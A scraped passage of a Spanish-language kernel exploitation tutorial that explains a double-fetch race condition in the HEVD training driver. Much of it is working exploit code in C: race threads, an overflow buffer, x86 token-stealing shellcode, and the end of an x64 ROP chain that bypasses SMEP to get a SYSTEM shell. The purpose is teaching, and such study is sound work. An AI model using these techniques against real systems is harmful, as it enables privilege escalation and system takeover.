0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x8b, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07 }; lpvShellcode = VirtualAlloc(NULL, 129, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (lpvShellcode == NULL) { printf(\u0026#34;[-] Failed to allocate memory to house shellcode\\n\u0026#34;); return -1; } RtlCopyMemory(lpvShellcode, sc, 129); for (i = 0; i \u0026lt; (RETOVR / sizeof(uint64_t)); i++) { *payload++ = nt + 0xa4ea7d; // ret } /* Prepare RDX register for later. This is needed for the XOR operation */ *payload++ = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret *payload++ = 0x000008; // Set RDX to 0x08, we will need this to accomplish the XOR *payload++ = 0x000000; // [filler] *payload++ = 0x000000; // [filler] /* Setup the call to MiGetPteAddress in order to get the address of the PTE for our userland code. The setup is as follows: RAX -\u0026gt; VOID *MiGetPteAddress( ( RCX == PTE / Userland Code ) ); Once the call is complete RAX should contain the pointer to our PTE. */ *payload++ = nt + 0x57699c; // pop rcx ; ret *payload++ = (uint64_t)lpvShellcode; // *shellcode *payload++ = nt + 0x24aaec; // MiGetPteAddress() /* Now that we have obtained the PTE address, we can modify the 2nd bit in order to mark the page as a kernel page (U -\u0026gt; K). We can do this using XOR ;) */ *payload++ = nt + 0x30fcf3; // sub rax, rdx ; ret *payload++ = nt + 0x54f344; // push rax ; pop rbx ; ret *payload++ = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret *payload++ = 0x000004; // 0x40ed4e: pop rdx ; pop rax ; pop rcx ; ret ; (1 found) *payload++ = 0x000000; // [filler] *payload++ = 0x000000; // [filler] *payload++ = nt + 0x3788b6; // xor [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret /* Now we cam spray our shellcode address since SMEP and VPS should be bypassed */ for (i = 0; i \u0026lt; 0xC; i++) { *payload++ = (uint64_t)lpvShellcode; } } /* Exploit(): Double Fetch */ int Exploit(HANDLE hHEVD) { LPVOID lpvNtKrnl = NULL; LPVOID lpvMemoryAllocation = NULL; HANDLE hThreadWork[NUM_THREADS] = { 0 }; HANDLE hThreadRace[NUM_THREADS] = { 0 }; PIRP_ARGS pIrpArgs = (PIRP_ARGS)malloc(sizeof(IRP_ARGS)); PDOUBLE_FETCH pDoubleFetchObject = (PDOUBLE_FETCH)malloc(sizeof(DOUBLE_FETCH)); lpvMemoryAllocation = VirtualAlloc(NULL, BUFFER, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvMemoryAllocation == NULL) { printf(\u0026#34;[-] Failed to allocate exploitation buffer\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Successfully allocated exploitation buffer\\n\u0026#34;); /* You already know ;) */ lpvNtKrnl = GetKernelModuleBase(\u0026#34;ntoskrnl\u0026#34;); if (lpvNtKrnl == NULL) { printf(\u0026#34;[-] Failed to obtain the base address of nt\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Obtained the base address of nt: 0x%p\\n\u0026#34;, lpvNtKrnl); /* Fill up the buffer */ GenerateExploitBuffer(lpvNtKrnl, lpvMemoryAllocation); /* Setup the Double Fetch object */ pDoubleFetchObject-\u0026gt;Buffer = lpvMemoryAllocation; pDoubleFetchObject-\u0026gt;Size = 0; /* Setup the base IRP argument(s) */ pIrpArgs-\u0026gt;hHEVD = hHEVD; pIrpArgs-\u0026gt;pDoubleFetch = pDoubleFetchObject; /* Start the race!! */ printf(\u0026#34;[*] Viol, Opr, Conspiracy Origins\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { hThreadWork[i] = CreateThread(NULL, 0, TriggerWorkingCondition, pIrpArgs, 0, NULL); hThreadRace[i] = CreateThread(NULL, 0, TriggerRaceCondition, pIrpArgs, 0, NULL); } WaitForMultipleObjects(NUM_THREADS, hThreadWork, TRUE, 10000); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { TerminateThread(hThreadWork[i], 0); CloseHandle(hThreadWork[i]); TerminateThread(hThreadRace[i], 0); CloseHandle(hThreadRace[i]); } return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] We won the race!!! Enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Una vez enviado, tenemos ejecución de código:\n","date":"1 February 2025","externalUrl":null,"permalink":"/posts/0x08-race-conditions-moderno-del-windows-kernel/","section":"Posts","summary":"","title":"0x08 - Race Conditions Moderno Del Windows Kernel","type":"posts"},{"content":"En el último tutorial explotamos una vulnerabilidad de Type Confusion contra Windows 11 (x64). En este tutorial, presentaremos un nuevo tipo de vulnerabilidad: una Condición de carrera o Race Condition, más específicamente, un Double Fetch!\nAl igual que en los tutoriales anteriores, la introducción a este tipo de vulnerabilidad lo vamos a ser dentro de Windows 7 (x86).\nTable of Contents # Qué es una Condición de Carrera (Alto Nivel) Usando el Código DoubleFetchIoctlHandler TriggerDoubleFetch Teoría Creando un PoC Explotación Recursos Qué es una Condición de Carrera (Alto Nivel) # Condicións de carrera o Race Conditions son una de las vulnerabilidades mas poderosas y complicadas que un atacador puede aprovechar. Como que fue ayer cuando Dirty Cow fue publicado - una vulnerabilidad que afectó a TODOS los sistemas basados ​​en Linux que utilizaban versiones anteriores del kernel.\nCon toda honestidad, antes de tomar el curso de RET2 Wargames, estos tipos de vulnerabilidades, incluso en un nivel alto, parecían completamente inaccesibles. Haré todo lo posible para ofrecer una buena descripción general de las causas de estas tipo de vulnerabilidades. Sin embargo, si de este tutorial sales confundido te recomiendo RET2 Wargames.\nCon eso, pasemos a una descripción general de alto nivel.\nPara nuestro ejemplo no técnico, veremos un juego con el que quizás estés familiarizado llamado Overcooked. En este juego, tú y tus amigos son responsables de cocinar comidas y hay límites de tiempo, en el juego tenéis que trabajar juntos para completar las ordenes rápidamente. Puedes imaginar que intenso se pone\u0026hellip;.\nTú y tus amigos a muchas veces estan tirandoan ingredientes a la misma olla.\nComo se muestra en la imagen de abajo, varios jugadores están preparando sopas:\nDentro de esta imagen vemos que se están haciendo dos sopas una sopa de cebolla y una sopa de tomate. También vemos a cuatro jugadores:\nUn payaso Un ajolote Un loro Una mujer Digamos que el jugador de ajolote es un troll y le gusta causar problemas. Vemos al ajolote agarrando una cebolla y vemos al loro cortando un tomate. Además vemos al payaso agarrando un tomate.\nPara cumplir la orden, la segunda sopa necesita un tomate.\nTanto el ajolote como el loro desean arrojar sus ingredientes a la olla, sin embargo, cada ingrediente tendrá un resultado diferente.\nSi el tomate llega a la olla, el equipo completará la orden Si la cebolla llega a la olla, el equipo tendrá que tirar la sopa y empezar de nuevo, posiblemente perdiendo la orden. El ajolote sabe que cada uno del equipo tiene un rol respectivo, sin embargo, el ajolote busca una vulnerabilidad en la forma en que se prepara la comida para poder explotarla (Race Condition). Como las siguientes dos sopas son de cebolla, el ajolote le dice al loro que le corte la cebolla.\nDado que todos los jugadores intentan dar las órdenes al mismo tiempo, se presenta una ventana de oportunidad para el ajolote. Si el loro está leyendo las órdenes y leyendo lo que la olla necesita, puede ser demasiado lento para darse cuenta de lo que el ajolote planea hacer (o más bien arrojar a la olla).\nEl ajolote decide aprovechar esto y manipula la sopa\u0026hellip;\nQué tiene esto que ver con los Race Conditions?\nPuedes pensar en cada jugador como un thread. Todos estos thread funcionan en paralelo y afectan a un recurso compartido (la olla). El Race Condition en este ejemplo ocurre cuando dos \u0026ldquo;threads\u0026rdquo; (jugadores) intentan modificar el recurso compartido al mismo tiempo; el ingrediente que se echa a la olla determina el resultado. Si la cebolla entra, es una explotación por parte del ajolote. En términos técnicos, un Race Condition ocurre cuando dos o más procesos o threads concurrentes intentan modificar o acceder a recursos compartidos simultáneamente, lo que genera consecuencias impredecibles o no deseadas.\nQué pasa si varios threads son responsables de las liberaciones? Qué pasa si varios threads son responsables de las asignaciones? Qué pasa si varios threads deciden qué camino toma una aplicación? Como puedes imaginar, los límites de los Race Conditions son infinitos.\nEmpecemos!\nUsando el Código # Primero necesitamos identificar codigo para esta vulnerabilidad.\n$ ls -l | grep Double -rw-r--r-- 1 wetw0rk wetw0rk 5801 Nov 18 12:32 DoubleFetch.c -rw-r--r-- 1 wetw0rk wetw0rk 2408 Nov 18 12:32 DoubleFetch.h El código nos dice que usaremos las siguientes estructuras y llamadas:\n// DoubleFetch.h 62 typedef struct _DOUBLE_FETCH 63 { 64 PVOID Buffer; 65 SIZE_T Size; 66 } DOUBLE_FETCH, *PDOUBLE_FETCH; // DoubleFetch.c DoubleFetchIoctlHandler() TriggerDoubleFetch() DoubleFetchIoctlHandler # Dentro de este controlador, podemos ver que nuestra entrada se convierte en un puntero de estructura para el tipo _DOUBLE_FETCH. Desde allí, nuestra entrada transmitida se envía a la función TriggerDoubleFetch().\n156 NTSTATUS 157 DoubleFetchIoctlHandler( 158 _In_ PIRP Irp, 159 _In_ PIO_STACK_LOCATION IrpSp 160 ) 161 { 162 PDOUBLE_FETCH UserDoubleFetch = NULL; 163 NTSTATUS Status = STATUS_UNSUCCESSFUL; 164 165 UNREFERENCED_PARAMETER(Irp); 166 PAGED_CODE(); 167 168 UserDoubleFetch = (PDOUBLE_FETCH)IrpSp-\u0026gt;Parameters.DeviceIoControl.Type3InputBuffer; 169 170 if (UserDoubleFetch) 171 { 172 Status = TriggerDoubleFetch(UserDoubleFetch); 173 } 174 175 return Status; 176 } TriggerDoubleFetch # TriggerDoubleFetch es donde empezamos a ver una operación más \u0026ldquo;complicada\u0026rdquo;.\n63 __declspec(safebuffers) 64 NTSTATUS 65 TriggerDoubleFetch( 66 _In_ PDOUBLE_FETCH UserDoubleFetch 67 ) 68 { 69 NTSTATUS Status = STATUS_SUCCESS; 70 ULONG KernelBuffer[BUFFER_SIZE] = { 0 }; 71 72 #ifdef SECURE 73 PVOID UserBuffer = NULL; 74 SIZE_T UserBufferSize = 0; 75 #endif 76 77 PAGED_CODE(); 78 79 __try 80 { 81 // 82 // Verify if the buffer resides in user mode 83 // 84 85 ProbeForRead(UserDoubleFetch, sizeof(DOUBLE_FETCH), (ULONG)__alignof(UCHAR)); 86 87 DbgPrint(\u0026#34;[+] UserDoubleFetch: 0x%p\\n\u0026#34;, UserDoubleFetch); 88 DbgPrint(\u0026#34;[+] KernelBuffer: 0x%p\\n\u0026#34;, \u0026amp;KernelBuffer); 89 DbgPrint(\u0026#34;[+] KernelBuffer Size: 0x%X\\n\u0026#34;, sizeof(KernelBuffer)); 90 91 #ifdef SECURE 92 UserBuffer = UserDoubleFetch-\u0026gt;Buffer; 93 UserBufferSize = UserDoubleFetch-\u0026gt;Size; 94 95 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Buffer: 0x%p\\n\u0026#34;, UserBuffer); 96 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Size: 0x%X\\n\u0026#34;, UserBufferSize); 97 98 if (UserBufferSize \u0026gt; sizeof(KernelBuffer)) 99 { 100 DbgPrint(\u0026#34;[-] Invalid Buffer Size: 0x%X\\n\u0026#34;, UserBufferSize); 101 102 Status = STATUS_INVALID_PARAMETER; 103 return Status; 104 } 105 106 // 107 // Secure Note: This is secure because the developer is fetching 108 // \u0026#39;UserDoubleFetch-\u0026gt;Buffer\u0026#39; and \u0026#39;UserDoubleFetch-\u0026gt;Size\u0026#39; from user 109 // mode just once and storing it in a temporary variable. Later, this 110 // stored values are passed to RtlCopyMemory()/memcpy(). Hence, there 111 // will be no race condition 112 // 113 114 RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, UserBufferSize); 115 #else 116 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Buffer: 0x%p\\n\u0026#34;, UserDoubleFetch-\u0026gt;Buffer); 117 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Size: 0x%X\\n\u0026#34;, UserDoubleFetch-\u0026gt;Size); 118 119 if (UserDoubleFetch-\u0026gt;Size \u0026gt; sizeof(KernelBuffer)) 120 { 121 DbgPrint(\u0026#34;[-] Invalid Buffer Size: 0x%X\\n\u0026#34;, UserDoubleFetch-\u0026gt;Size); 122 123 Status = STATUS_INVALID_PARAMETER; 124 return Status; 125 } 126 127 DbgPrint(\u0026#34;[+] Triggering Double Fetch\\n\u0026#34;); 128 129 // 130 // Vulnerability Note: This is a vanilla Double Fetch vulnerability because the 131 // developer is fetching \u0026#39;UserDoubleFetch-\u0026gt;Buffer\u0026#39; and \u0026#39;UserDoubleFetch-\u0026gt;Size\u0026#39; 132 // from user mode twice and the double fetched values are passed to RtlCopyMemory()/memcpy(). 133 // This creates a race condition and the size check could be bypassed which will later 134 // cause stack based buffer overflow 135 // 136 137 RtlCopyMemory((PVOID)KernelBuffer, UserDoubleFetch-\u0026gt;Buffer, UserDoubleFetch-\u0026gt;Size); 138 #endif 139 } 140 __except (EXCEPTION_EXECUTE_HANDLER) 141 { 142 Status = GetExceptionCode(); 143 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 144 } 145 146 return Status; 147 } Analicemos esto.\nComenzando en las líneas 63-90, vemos que se está utilizando un búfer con un tamaño total de 512 bytes para KernelBuffer (este tamaño se puede obtener de la definición BUFFER_SIZE en Common.h).\n63 __declspec(safebuffers) 64 NTSTATUS 65 TriggerDoubleFetch( 66 _In_ PDOUBLE_FETCH UserDoubleFetch 67 ) 68 { 69 NTSTATUS Status = STATUS_SUCCESS; 70 ULONG KernelBuffer[BUFFER_SIZE] = { 0 }; 71 72 #ifdef SECURE 73 PVOID UserBuffer = NULL; 74 SIZE_T UserBufferSize = 0; 75 #endif 76 77 PAGED_CODE(); 78 79 __try 80 { 81 // 82 // Verify if the buffer resides in user mode 83 // 84 85 ProbeForRead(UserDoubleFetch, sizeof(DOUBLE_FETCH), (ULONG)__alignof(UCHAR)); 86 87 DbgPrint(\u0026#34;[+] UserDoubleFetch: 0x%p\\n\u0026#34;, UserDoubleFetch); 88 DbgPrint(\u0026#34;[+] KernelBuffer: 0x%p\\n\u0026#34;, \u0026amp;KernelBuffer); 89 DbgPrint(\u0026#34;[+] KernelBuffer Size: 0x%X\\n\u0026#34;, sizeof(KernelBuffer)); 90 91 #ifdef SECURE 92 UserBuffer = UserDoubleFetch-\u0026gt;Buffer; 93 UserBufferSize = UserDoubleFetch-\u0026gt;Size; 94 95 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Buffer: 0x%p\\n\u0026#34;, UserBuffer); 96 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Size: 0x%X\\n\u0026#34;, UserBufferSize); 97 98 if (UserBufferSize \u0026gt; sizeof(KernelBuffer)) 99 { 100 DbgPrint(\u0026#34;[-] Invalid Buffer Size: 0x%X\\n\u0026#34;, UserBufferSize); 101 102 Status = STATUS_INVALID_PARAMETER; 103 return Status; 104 } 105 106 // 107 // Secure Note: This is secure because the developer is fetching 108 // \u0026#39;UserDoubleFetch-\u0026gt;Buffer\u0026#39; and \u0026#39;UserDoubleFetch-\u0026gt;Size\u0026#39; from user 109 // mode just once and storing it in a temporary variable. Later, this 110 // stored values are passed to RtlCopyMemory()/memcpy(). Hence, there 111 // will be no race condition 112 // 113 114 RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, UserBufferSize); Líneas 115-147 empezamos a ver la vulnerabilidad. Podemos ver que si el tamaño del miembro Size de la estructura _DOUBLE_FETCH es mayor que el tamaño de sizeof(KernelBuffer), el controlador devolverá.\nDe lo contrario llegamos a la llamada a la función RtlCopyMemory().\n115 #else 116 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Buffer: 0x%p\\n\u0026#34;, UserDoubleFetch-\u0026gt;Buffer); 117 DbgPrint(\u0026#34;[+] UserDoubleFetch-\u0026gt;Size: 0x%X\\n\u0026#34;, UserDoubleFetch-\u0026gt;Size); 118 119 if (UserDoubleFetch-\u0026gt;Size \u0026gt; sizeof(KernelBuffer)) 120 { 121 DbgPrint(\u0026#34;[-] Invalid Buffer Size: 0x%X\\n\u0026#34;, UserDoubleFetch-\u0026gt;Size); 122 123 Status = STATUS_INVALID_PARAMETER; 124 return Status; 125 } 126 127 DbgPrint(\u0026#34;[+] Triggering Double Fetch\\n\u0026#34;); 128 129 // 130 // Vulnerability Note: This is a vanilla Double Fetch vulnerability because the 131 // developer is fetching \u0026#39;UserDoubleFetch-\u0026gt;Buffer\u0026#39; and \u0026#39;UserDoubleFetch-\u0026gt;Size\u0026#39; 132 // from user mode twice and the double fetched values are passed to RtlCopyMemory()/memcpy(). 133 // This creates a race condition and the size check could be bypassed which will later 134 // cause stack based buffer overflow 135 // 136 137 RtlCopyMemory((PVOID)KernelBuffer, UserDoubleFetch-\u0026gt;Buffer, UserDoubleFetch-\u0026gt;Size); 138 #endif 139 } 140 __except (EXCEPTION_EXECUTE_HANDLER) 141 { 142 Status = GetExceptionCode(); 143 DbgPrint(\u0026#34;[-] Exception Code: 0x%X\\n\u0026#34;, Status); 144 } 145 146 return Status; 147 } Teoría # Al observar la estructura, podemos simplemente pasar un puntero a un búfer grande y establecer el tamaño en algo pequeño? Por supuesto que tenemos que hacer esto en el momento perfecto\u0026hellip;\nQuizás podamos enviar algo como esto:\n+-----------+---------------------------------+ | Thread #1 | Spam DOUBLE_FETCH.Size (0x10) | +-----------+---------------------------------+ | Thread #2 | Spam DOUBLE_FETCH.Size (0x1000) | +-----------+---------------------------------+ Creando un PoC # Con un plan de ataque sólido implementado, podemos comenzar a elaborar un PoC como se ve abajo.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #include \u0026lt;processthreadsapi.h\u0026gt; #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_IOCTL_DOUBLE_FETCH IOCTL(0x80D) /* Structure used by Double Fetch */ typedef struct _DOUBLE_FETCH { PVOID Buffer; SIZE_T Size; } DOUBLE_FETCH, *PDOUBLE_FETCH; /* Structure for threads */ typedef struct _IRP_ARGS { HANDLE hHEVD; PDOUBLE_FETCH pDoubleFetch; } IRP_ARGS, *PIRP_ARGS; /* Max threads */ #define NUM_THREADS 5 /* Exploit Buffer */ #define BUFFER 0x1000 /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* TriggerRaceCondition(): Since driver reads from userland twice we can overwrite the existing condition that bypasses the checkslmgr -rearm at runtime. If we win the race we successfully trigger a buffer overflow! */ DWORD WINAPI TriggerRaceCondition(LPVOID lpParameters) { PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = BUFFER; } return 0; } /* TriggerWorkingCondition(): As we saw in TriggerDoubleFetch() in order to reach the RtlCopyMemory() aka wrapper for memcpy() we need our buffer to be under the sizeof(KernelBuffer). This function sends an IOCTL to ensure we meed that condition. */ DWORD WINAPI TriggerWorkingCondition(LPVOID lpParameters) { DWORD dwBytesReturned = 0; PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; printf(\u0026#34;\\t[*] Spraying DoubleFetchObject(s): %p, Size: 0x%x\\n\u0026#34;, pIrpArgs-\u0026gt;pDoubleFetch, pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size); while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = 0x10; DeviceIoControl(pIrpArgs-\u0026gt;hHEVD, HEVD_IOCTL_DOUBLE_FETCH, pIrpArgs-\u0026gt;pDoubleFetch, sizeof(DOUBLE_FETCH), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); } return 0; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ void GenerateExploitBuffer(LPVOID lpvBuffer) { uint32_t *payload = (uint32_t *)(lpvBuffer); for (int i = 0; i \u0026lt; (BUFFER / sizeof(uint32_t)); i++) { *payload++ = 0x41414141; } } /* Exploit(): Double Fetch */ int Exploit(HANDLE hHEVD) { LPVOID lpvMemoryAllocation = NULL; HANDLE hThreadWork[NUM_THREADS] = { 0 }; HANDLE hThreadRace[NUM_THREADS] = { 0 }; PIRP_ARGS pIrpArgs = (PIRP_ARGS)malloc(sizeof(IRP_ARGS)); PDOUBLE_FETCH pDoubleFetchObject = (PDOUBLE_FETCH)malloc(sizeof(DOUBLE_FETCH)); lpvMemoryAllocation = VirtualAlloc(NULL, BUFFER, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); /* Fill up the buffer */ GenerateExploitBuffer(lpvMemoryAllocation); /* Setup the Double Fetch object */ pDoubleFetchObject-\u0026gt;Buffer = lpvMemoryAllocation; pDoubleFetchObject-\u0026gt;Size = 0; /* Setup the base IRP argument(s) */ pIrpArgs-\u0026gt;hHEVD = hHEVD; pIrpArgs-\u0026gt;pDoubleFetch = pDoubleFetchObject; /* Start the race!! */ printf(\u0026#34;[*] Off to the races\\n\u0026#34;); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { hThreadWork[i] = CreateThread(NULL, 0, TriggerWorkingCondition, pIrpArgs, 0, NULL); hThreadRace[i] = CreateThread(NULL, 0, TriggerRaceCondition, pIrpArgs, 0, NULL); } WaitForMultipleObjects(NUM_THREADS, hThreadWork, TRUE, 10000); for (int i = 0; i \u0026lt; NUM_THREADS; i++) { TerminateThread(hThreadWork[i], 0); CloseHandle(hThreadWork[i]); TerminateThread(hThreadRace[i], 0); CloseHandle(hThreadRace[i]); } return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation successful, enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Una vez que se envía el búfer, se produce el siguiente choque:\nSi nosotros !analyze -v esto, vemos lo siguiente:\nSegún mi experiencia con HEVD, esto normalmente significa que nuestro búfer es tan grande que dañamos la memoria, lo que nos permite sobrescribir la dirección de retorno limpia. Entonces la solución aquí es enviar un búfer más pequeño. En honor a 2600 decidí enviar 2600 bytes!\nUna vez enviado, tenemos control sobre el puntero de instrucciones!\nExplotación # Después de jugar con el codigo un poco, desarrollé lo siguiente:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; #include \u0026lt;processthreadsapi.h\u0026gt; #define IOCTL(Function) CTL_CODE (FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) #define HEVD_IOCTL_DOUBLE_FETCH IOCTL(0x80D) /* Structure used by Double Fetch */ typedef struct _DOUBLE_FETCH { PVOID Buffer; SIZE_T Size; } DOUBLE_FETCH, *PDOUBLE_FETCH; /* Structure for threads */ typedef struct _IRP_ARGS { HANDLE hHEVD; PDOUBLE_FETCH pDoubleFetch; } IRP_ARGS, *PIRP_ARGS; /* Max threads */ #define NUM_THREADS 5 /* Exploit Buffer */ #define BUFFER 2084 /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* TriggerRaceCondition(): Since driver reads from userland twice we can overwrite the existing condition that bypasses the check at runtime. If we win the race we successfully trigger a buffer overflow! */ DWORD WINAPI TriggerRaceCondition(LPVOID lpParameters) { PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = BUFFER; } return 0; } /* TriggerWorkingCondition(): As we saw in TriggerDoubleFetch() in order to reach the RtlCopyMemory() aka wrapper for memcpy() we need our buffer to be under the sizeof(KernelBuffer). This function sends an IOCTL to ensure we meed that condition. */ DWORD WINAPI TriggerWorkingCondition(LPVOID lpParameters) { DWORD dwBytesReturned = 0; PIRP_ARGS pIrpArgs = (PIRP_ARGS)lpParameters; printf(\u0026#34;\\t[*] Spraying DoubleFetchObject(s): %p, Size: 0x%x\\n\u0026#34;, pIrpArgs-\u0026gt;pDoubleFetch, pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size); while (1) { pIrpArgs-\u0026gt;pDoubleFetch-\u0026gt;Size = 0x10; DeviceIoControl(pIrpArgs-\u0026gt;hHEVD, HEVD_IOCTL_DOUBLE_FETCH, pIrpArgs-\u0026gt;pDoubleFetch, sizeof(DOUBLE_FETCH), NULL, 0x00, \u0026amp;dwBytesReturned, NULL); } return 0; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ DWORD GenerateExploitBuffer(LPVOID lpvBuffer) { uint32_t *payload = (uint32_t *)(lpvBuffer); LPVOID lpvShellcode = NULL; char shellcode[]= // sickle-tool -p windows/x86/kernel_token_stealer -f c -m pinpoint \u0026#34;\\x60\u0026#34; // pushal \u0026#34;\\x31\\xc0\u0026#34; // xor eax, eax \u0026#34;\\x64\\x8b\\x80\\x24\\x01\\x00\\x00\u0026#34; // mov eax, dword ptr fs:[eax + 0x124] \u0026#34;\\x8b\\x40\\x50\u0026#34; // mov eax, dword ptr [eax + 0x50] \u0026#34;\\x89\\xc1\u0026#34; // mov ecx, eax \u0026#34;\\xba\\x04\\x00\\x00\\x00\u0026#34; // mov edx, 4 \u0026#34;\\x8b\\x80\\xb8\\x00\\x00\\x00\u0026#34; // mov eax, dword ptr [eax + 0xb8] \u0026#34;\\x2d\\xb8\\x00\\x00\\x00\u0026#34; // sub eax, 0xb8 \u0026#34;\\x39\\x90\\xb4\\x00\\x00\\x00\u0026#34; // cmp dword ptr [eax + 0xb4], edx \u0026#34;\\x75\\xed\u0026#34; // jne 0x1014 \u0026#34;\\x8b\\x90\\xf8\\x00\\x00\\x00\u0026#34; // mov edx, dword ptr [eax + 0xf8] \u0026#34;\\x89\\x91\\xf8\\x00\\x00\\x00\u0026#34; // mov dword ptr [ecx + 0xf8], edx \u0026#34;\\x61\u0026#34; // popal /* RETURN CODE */ \u0026#34;\\x5d\u0026#34; // POP EBP \u0026#34;\\xc2\\x08\\x00\u0026#34;; // RET 0x08 lpvShellcode = VirtualAlloc(NULL, 57, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvShellcode == NULL) { printf(\u0026#34;[-] Failed to generate shellcode allocation\\n\u0026#34;); return -1; } printf(\u0026#34;[*] Copying shellcode to allocated memory region\\n\u0026#34;); memcpy(lpvShellcode, shellcode, 57); for (int i = 0; i \u0026lt; (BUFFER / sizeof(uint32_t)); i++) { *payload++ = (uint32_t)lpvShellcode; } return 0; } /* Exploit(): Double Fetch */ DWORD 